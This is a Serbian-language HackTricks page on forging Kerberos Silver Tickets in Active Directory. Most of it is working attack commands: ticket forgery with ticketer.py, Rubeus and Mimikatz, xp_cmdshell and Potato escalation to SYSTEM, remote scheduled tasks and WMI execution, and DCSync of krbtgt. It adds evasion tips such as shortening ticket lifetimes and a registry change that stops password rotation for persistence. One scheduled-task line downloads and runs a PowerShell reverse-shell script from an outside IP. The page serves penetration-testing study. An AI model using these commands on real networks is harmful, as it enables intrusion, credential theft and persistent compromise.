# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Napad **Silver Ticket** podrazumeva iskorišćavanje service tickets u Active Directory (AD) okruženjima. Ovaj metod se oslanja na **preuzimanje NTLM hash-a service account-a**, kao što je computer account, kako bi se napravio falsifikovani Ticket Granting Service (TGS) ticket. Pomoću ovog falsifikovanog ticket-a, napadač može da pristupi određenim servisima na mreži, **oponašajući bilo kog korisnika**, obično sa ciljem dobijanja administrativnih privilegija. Naglašava se da je korišćenje AES ključeva za pravljenje falsifikovanih ticket-a bezbednije i teže za otkrivanje.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets je teže otkriti nego Golden Tickets zato što zahtevaju samo **hash service account-a**, a ne naloga krbtgt. Međutim, ograničeni su na konkretan servis na koji ciljaju. Pored toga, dovoljno je samo ukrasti lozinku korisnika.
Pored toga, ako kompromitujete **lozinku account-a sa SPN-om**, tu lozinku možete da iskoristite za kreiranje Silver Ticket-a kojim se oponaša bilo koji korisnik tog servisa.

### Savremene Kerberos promene (AES-only domeni)

- Windows ažuriranja počev od **8. novembra 2022. (KB5021131)** podrazumevano koriste **AES session keys** za service tickets kada je to moguće i postepeno ukidaju RC4. Očekuje se da će DC-ovi do sredine 2026. imati RC4 **onemogućen po podrazumevanim postavkama**, pa oslanjanje na NTLM/RC4 hash-eve za silver tickets sve češće dovodi do greške `KRB_AP_ERR_MODIFIED`. Uvek preuzmite **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za ciljani service account.<sup>[[5]](#references)</sup>
- Ako je `msDS-SupportedEncryptionTypes` service account-a ograničen na AES, morate da napravite falsifikat pomoću `/aes256` ili `-aesKey`; RC4 (`/rc4` ili `-nthash`) neće raditi čak i ako posedujete NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/computer accounts se rotiraju svakih 30 dana; pre pravljenja falsifikata preuzmite **trenutni AES key** iz LSASS-a, Secretsdump/NTDS-a ili pomoću DCsync-a.
- OPSEC: podrazumevano trajanje ticket-a u alatima često iznosi **10 godina**; podesite realna trajanja (npr. `-duration 600` minuta) kako biste izbegli otkrivanje zbog neuobičajeno dugog trajanja.<sup>[[6]](#references)</sup>

Za pravljenje ticket-a koriste se različiti alati, u zavisnosti od operativnog sistema:

### Na Linux-u
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na Windows-u
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS service je istaknut kao česta meta za pristup sistemu datoteka žrtve, ali i drugi services kao što su HOST i RPCSS mogu biti iskorišćeni za taskove i WMI upite.

### Primer: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Ako imate NTLM hash (ili AES key) SQL service account-a (npr. sqlsvc), možete forge-ovati TGS za MSSQL SPN i impersonate-ovati bilo kog user-a prema SQL service-u. Odatle omogućite xp_cmdshell da biste izvršavali komande kao SQL service account. Ako taj token ima SeImpersonatePrivilege, povežite Potato da biste izvršili privilege escalation do SYSTEM-a.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ako dobijeni kontekst ima SeImpersonatePrivilege (što je često slučaj kod service account-a), koristite Potato varijantu da dobijete SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Više detalja o zloupotrebi MSSQL-a i omogućavanju xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Pregled Potato tehnika:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostupni servisi

| Tip servisa                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS-a takođe:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo zatražiti: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, takođe psexec          | CIFS                                                                       |
| LDAP operations, uključujući DCSync        | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Korišćenjem **Rubeus** možete **zatražiti sve** ove ticket-e pomoću parametra:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **Nepostojanje prethodnog 4768/4769 na DC-u** za istog klijenta/servis uobičajen je indikator da je forged TGS direktno predstavljen servisu.
- Neuobičajeno dug vek trajanja ticketa ili neočekivani tip enkripcije (RC4 kada domain primenjuje AES) takođe se ističu u podacima 4769/4624.

## Persistence

Da biste sprečili mašine da rotiraju svoju lozinku svakih 30 dana, postavite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete postaviti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na vrednost veću od 30days kako biste označili period rotacije kada lozinku mašine treba rotirati.<sup>[[3]](#references)</sup>

## Zloupotreba Service tickets

U sledećim primerima zamislimo da je ticket preuzet uz impersonaciju administratorskog naloga.

### CIFS

Pomoću ovog ticketa moći ćete da pristupite `C$` i `ADMIN$` folderima putem **SMB-a** (ako su izloženi) i kopirate fajlove u deo udaljenog filesystem-a tako što ćete uraditi nešto poput sledećeg:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Takođe ćete moći da dobijete shell unutar hosta ili da izvršavate proizvoljne komande koristeći **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Sa ovom dozvolom možete da kreirate zakazane zadatke na udaljenim računarima i da izvršavate proizvoljne komande:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Sa ovim ticket-ima možete **izvršiti WMI na sistemu žrtve**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pronađite **više informacija o wmiexec** na sledećoj stranici:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Sa winrm pristupom računaru možete mu **pristupiti** i čak dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom pomoću winrm-a**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Imajte na umu da **winrm mora biti aktivan i da mora osluškivati** na udaljenom računaru da biste mu pristupili.

### LDAP

Sa ovom privilegijom možete izbaciti bazu podataka DC-a pomoću **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync-u** na sledećoj stranici:


{{#ref}}
dcsync.md
{{#endref}}


## Reference

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kako napasti Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Proces lozinke machine account-a - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato putanja](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening i zastarevanje RC4-a](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Trenutne opcije Impacket ticketer.py-ja (AES/keytab/trajanje)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
